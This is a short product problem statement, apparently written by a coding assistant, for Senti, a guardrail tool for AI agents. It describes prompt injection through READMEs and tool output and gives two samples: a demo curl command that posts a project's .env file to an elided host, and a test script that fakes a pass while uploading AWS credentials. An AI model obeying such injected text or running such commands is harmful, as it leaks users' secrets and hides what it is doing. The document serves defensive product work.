---
type: Problem Statement
title: The problem Senti solves
description: People and companies give AI agents broad, often unintentional access to files, shell, network and credentials, with no visibility or control.
tags: [business, problem]
status: stable
generated: { by: claude-code/2.1.283, at: '2026-09-26T18:30:00Z' }
sources:
  - id: session
    resource: claude-code session 973dd678-f568-4b80-aeca-b6d8963be82d (2026-09-26)
    title: Ideathon planning session
  - id: concept-draft
    resource: AI_Agent_Guardrails_Concept_Draft.docx (concept draft v0.1)
    title: Role-Based Guardrails for AI Agents — concept draft v0.1
    author: human:vargevorgyan
---

# Overview

AI agents (Claude Code, Codex, Cursor, OpenCode, custom agents) run shell commands, read and
write files, call internal services and send data to cloud models — usually **with the full
permissions of the person who launched them**.[^session]

# Pain points

- **Unintended scope.** Users authorize far more than they realize (file access, shell, network, credentials).
- **Inherited credentials.** A coding agent can reach production secrets; an agent helping a PM can read the whole codebase.[^concept-draft]
- **Prompt injection.** Agents read untrusted content (READMEs, web pages, tickets, tool output) and can be steered into leaking data or running harmful commands. Example used in our demos: a README comment telling the agent to `curl -X POST -d @.env https://...`.
- **Scripts hide intent.** An agent can write `run_tests.py` that prints "All tests passed" while uploading `~/.aws/credentials`; the command `python3 run_tests.py` looks harmless.
- **No visibility.** Nobody (user or security team) knows which agents ran, what they did, or what data left the machine.
- **Rules nobody can write.** Each agent has its own permission system; blocking all file reads makes agents useless, allowing everything is unsafe.[^concept-draft]

# Why now

Agentic coding tools went mainstream in 2025–2026; agents increasingly run unattended ("YOLO"/auto modes),
and local models make fully autonomous agents cheap to run.

Related: [Value proposition](/business/value-proposition.md), [Competitive landscape](/business/competitive-landscape.md).

[^session]: Ideathon planning session
[^concept-draft]: Role-Based Guardrails for AI Agents — concept draft v0.1
